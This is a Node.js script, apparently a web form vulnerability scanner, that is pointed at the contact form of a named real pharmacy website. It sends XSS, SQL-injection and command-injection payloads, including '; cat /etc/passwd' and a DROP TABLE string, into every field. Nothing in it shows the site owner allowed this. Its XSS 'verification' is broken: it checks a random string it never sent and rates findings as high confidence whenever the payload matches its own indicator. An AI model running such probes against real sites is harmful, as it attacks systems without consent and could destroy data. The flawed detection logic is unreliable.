/**
 * Form Vulnerability Tester
 * A simple tool to test web forms for common vulnerabilities
 */

const axios = require('axios');
const cheerio = require('cheerio');

// Example target form - now targeting redcare-apotheke.ch
const TARGET_FORM = 'https://redcare-apotheke.ch/kontakt';

// Common test payloads
const TEST_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "' OR '1'='1",
    '"; DROP TABLE users; --',
    '| ls',
    '; cat /etc/passwd'
];

class FormTester {
    constructor() {
        this.results = [];
        this.verifiedResults = [];
    }

    async analyzeForm(url) {
        console.log(`[INFO] Analyzing form at ${url}`);
        
        try {
            const response = await axios.get(url);
            const $ = cheerio.load(response.data);
            
            const forms = $('form');
            console.log(`[INFO] Found ${forms.length} form(s)`);
            
            forms.each((index, form) => {
                const formAction = $(form).attr('action') || url;
                const formMethod = $(form).attr('method') || 'GET';
                
                console.log(`[INFO] Form ${index + 1}: ${formMethod} ${formAction}`);
                
                // Find all input fields
                const inputs = $(form).find('input, textarea, select');
                const formData = {};
                
                inputs.each((i, input) => {
                    const inputType = $(input).attr('type') || 'text';
                    const inputName = $(input).attr('name') || `field${i}`;
                    formData[inputName] = inputType;
                    console.log(`  Input: ${inputType} name="${inputName}"`);
                });
                
                // Test the form with payloads
                this.testForm(url, formAction, formMethod, formData);
            });
        } catch (error) {
            console.error(`[ERROR] Failed to analyze form: ${error.message}`);
        }
    }

    async testForm(baseUrl, action, method, formData) {
        console.log(`[INFO] Testing form with payloads...`);
        
        // Resolve relative URLs
        let fullAction = action;
        if (action.startsWith('/')) {
            const urlObj = new URL(baseUrl);
            fullAction = `${urlObj.origin}${action}`;
        } else if (!action.startsWith('http')) {
            fullAction = `${baseUrl}/${action}`;
        }
        
        for (const payload of TEST_PAYLOADS) {
            // Create form data with payload
            const testData = {};
            for (const [fieldName, fieldType] of Object.entries(formData)) {
                // Skip submit buttons and other non-input fields
                if (fieldType !== 'submit' && fieldType !== 'button') {
                    testData[fieldName] = payload;
                }
            }
            
            try {
                let response;
                if (method.toUpperCase() === 'POST') {
                    response = await axios.post(fullAction, testData);
                } else {
                    // For GET requests, append parameters to URL
                    const params = new URLSearchParams(testData).toString();
                    const urlWithParams = `${fullAction}?${params}`;
                    response = await axios.get(urlWithParams);
                }
                
                // Check for vulnerabilities in response
                const vulnerability = await this.analyzeResponse(response.data, payload, fullAction);
                if (vulnerability) {
                    this.results.push({
                        url: fullAction,
                        vulnerability: vulnerability.type,
                        payload: payload,
                        severity: vulnerability.severity,
                        confidence: vulnerability.confidence,
                        timestamp: new Date().toISOString()
                    });
                    console.log(`[VULN] ${vulnerability.type} found with payload: ${payload}`);
                }
            } catch (error) {
                // Continue with other tests
                console.error(`[ERROR] Form test failed: ${error.message}`);
            }
        }
    }

    async analyzeResponse(data, payload, url) {
        // Convert data to string if it's not already
        const dataStr = typeof data === 'string' ? data : JSON.stringify(data);
        
        // Check for XSS
        if (dataStr.includes(payload)) {
            // Verify XSS with additional checks
            const isVerifiedXSS = await this.verifyXSS(dataStr, payload);
            if (isVerifiedXSS) {
                return {
                    type: 'Reflected XSS',
                    severity: 'High',
                    confidence: 'High'
                };
            } else {
                return {
                    type: 'Reflected XSS',
                    severity: 'High',
                    confidence: 'Low'
                };
            }
        }
        
        // Check for SQL errors
        const sqlErrors = [
            'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL', 
            'JDBC', 'ODBC', 'SQLite', 'You have an error in your SQL syntax'
        ];
        
        const hasSQLError = sqlErrors.some(error => 
            dataStr.includes(error)
        );
        
        if (hasSQLError) {
            // Verify SQL injection with additional checks
            const isVerifiedSQL = await this.verifySQLInjection(dataStr);
            if (isVerifiedSQL) {
                return {
                    type: 'SQL Error Disclosure',
                    severity: 'Medium',
                    confidence: 'High'
                };
            } else {
                return {
                    type: 'SQL Error Disclosure',
                    severity: 'Medium',
                    confidence: 'Low'
                };
            }
        }
        
        return null; // No vulnerabilities found
    }

    async verifyXSS(dataStr, payload) {
        // Additional verification to reduce false positives
        try {
            // Test with a random payload to see if reflection is normal behavior
            const randomPayload = `random${Math.floor(Math.random() * 1000000)}`;
            
            // If random payload is also reflected, this might be normal behavior
            if (dataStr.includes(randomPayload)) {
                return false; // Likely false positive
            }
            
            // Check if payload is executed (not just reflected)
            // Look for evidence that the payload would actually execute
            const executionIndicators = [
                '<script>alert("XSS")</script>',
                'onerror=alert("XSS")',
                'javascript:alert("XSS")'
            ];
            
            for (const indicator of executionIndicators) {
                if (payload.includes(indicator)) {
                    return true; // Strong evidence of XSS
                }
            }
            
            return false; // Need manual verification
        } catch (error) {
            return false;
        }
    }

    async verifySQLInjection(dataStr) {
        // Additional verification to reduce false positives
        try {
            // Check for specific SQL error patterns that indicate real vulnerabilities
            const specificSQLErrors = [
                'You have an error in your SQL syntax',
                'Warning: mysql_fetch',
                'ORA-009',
                'PostgreSQL Error'
            ];
            
            const hasSpecificError = specificSQLErrors.some(error => 
                dataStr.includes(error)
            );
            
            return hasSpecificError; // More specific errors indicate real vulnerability
        } catch (error) {
            return false;
        }
    }

    async runTests() {
        console.log('=== Form Vulnerability Tester ===');
        await this.analyzeForm(TARGET_FORM);
        
        // Filter results to only include high confidence findings
        this.verifiedResults = this.results.filter(result => 
            result.confidence === 'High'
        );
        
        this.printResults();
    }

    printResults() {
        console.log('\n=== Test Results ===');
        console.log(`Total potential issues found: ${this.results.length}`);
        console.log(`High confidence findings: ${this.verifiedResults.length}`);
        
        if (this.verifiedResults.length === 0) {
            console.log('No high confidence vulnerabilities found.');
        } else {
            console.log(`Found ${this.verifiedResults.length} high confidence issues:`);
            for (const result of this.verifiedResults) {
                console.log(`  - ${result.vulnerability} (${result.severity})`);
                console.log(`    URL: ${result.url}`);
                console.log(`    Payload: ${result.payload}`);
                console.log();
            }
        }
        
        if (this.results.length > this.verifiedResults.length) {
            console.log('Low confidence findings (require manual verification):');
            const lowConfidence = this.results.filter(result => result.confidence === 'Low');
            for (const result of lowConfidence) {
                console.log(`  - ${result.vulnerability} (${result.severity})`);
                console.log(`    URL: ${result.url}`);
                console.log(`    Payload: ${result.payload}`);
                console.log();
            }
        }
    }
}

// Run the form tester
if (require.main === module) {
    const tester = new FormTester();
    tester.runTests();
}

module.exports = FormTester;